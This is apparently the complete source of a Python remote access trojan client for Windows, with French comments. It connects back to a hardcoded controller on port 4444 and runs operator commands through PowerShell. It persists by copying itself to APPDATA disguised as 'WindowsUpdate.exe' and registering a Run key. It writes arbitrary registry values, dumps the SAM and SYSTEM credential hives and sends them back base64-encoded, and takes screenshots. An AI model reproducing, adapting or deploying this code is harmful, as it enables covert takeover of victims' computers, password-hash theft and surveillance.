import socket
import subprocess
import os
import sys
import base64
import time
import shutil
import winreg
import mss

SERVER_IP = "192.168.1.100"
SERVER_PORT = 4444
BUFFER = 4096


# recupere la vraie ip de la machine, pas 127.0.0.1
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"


def main():
    print(f"[*] Client demarre - IP: {get_ip()}")

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")

            # on envoie le hostname et notre ip
            sock.send(f"{socket.gethostname()} - {get_ip()}".encode())

            while True:
                try:
                    commande = sock.recv(BUFFER).decode("utf-8").strip()
                    if not commande:
                        break

                    if commande == "exit":
                        sock.close()
                        return

                    elif commande == "persistance":
                        resultat = setup_persistence()
                        sock.send(resultat.encode())

                    elif commande.startswith("regedit "):
                        parts = commande.split(" ", 3)
                        if len(parts) == 4:
                            resultat = add_registry_key(parts[1], parts[2], parts[3])
                        else:
                            resultat = "Usage: regedit CHEMIN NOM VALEUR"
                        sock.send(resultat.encode())

                    elif commande == "sam":
                        resultat = dump_sam()
                        sock.sendall(resultat.encode())

                    elif commande == "screenshot":
                        data = take_screenshot()
                        sock.sendall(data)

                    else:
                        resultat = execute_cmd(commande)
                        sock.send(resultat.encode())

                except Exception as e:
                    print(f"[!] Erreur: {e}")
                    try:
                        sock.send(f"Erreur: {e}".encode())
                    except:
                        break

        except:
            try:
                sock.close()
            except:
                pass
            print("[*] Reconnexion dans 5s...")
            time.sleep(5)


# se copie dans appdata et s'ajoute au demarrage de windows
def setup_persistence():
    try:
        dest = os.path.join(os.environ["APPDATA"], "WindowsUpdate.exe")
        if not os.path.exists(dest):
            shutil.copy2(sys.argv[0], dest)

        clef = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(clef, "WindowsUpdate", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(clef)
        return "Persistance activee"
    except Exception as e:
        return f"Erreur persistance: {e}"


# ajoute une clef dans le registre windows
def add_registry_key(chemin, nom, valeur):
    try:
        clef = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chemin, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(clef, nom, 0, winreg.REG_SZ, valeur)
        winreg.CloseKey(clef)
        return f"Clef ajoutee: {chemin}\\{nom} = {valeur}"
    except Exception as e:
        return f"Erreur registre: {e}"


# recupere les fichiers SAM et SYSTEM (faut etre admin)
def dump_sam():
    try:
        subprocess.run(["reg", "save", "HKLM\\SAM", "sam.hive", "/y"],
                       capture_output=True, check=True)
        subprocess.run(["reg", "save", "HKLM\\SYSTEM", "system.hive", "/y"],
                       capture_output=True, check=True)

        with open("sam.hive", "rb") as f:
            sam = base64.b64encode(f.read()).decode()
        with open("system.hive", "rb") as f:
            system = base64.b64encode(f.read()).decode()

        os.remove("sam.hive")
        os.remove("system.hive")
        return f"SAM:{sam}\nSYSTEM:{system}"
    except Exception as e:
        for fic in ["sam.hive", "system.hive"]:
            if os.path.exists(fic):
                os.remove(fic)
        return f"Erreur SAM: {e}"


# prend un screenshot et renvoie les bytes png bruts
def take_screenshot():
    try:
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            return mss.tools.to_png(img.rgb, img.size)
    except Exception as e:
        return f"Erreur screenshot: {e}".encode()


# execute une commande powershell et renvoie la sortie
def execute_cmd(cmd):
    proc = subprocess.run(
        ["powershell.exe", "-Command", cmd],
        capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=30
    )
    output = proc.stdout + proc.stderr
    if not output.strip():
        output = "(pas de sortie)"
    return output


if __name__ == "__main__":
    main()
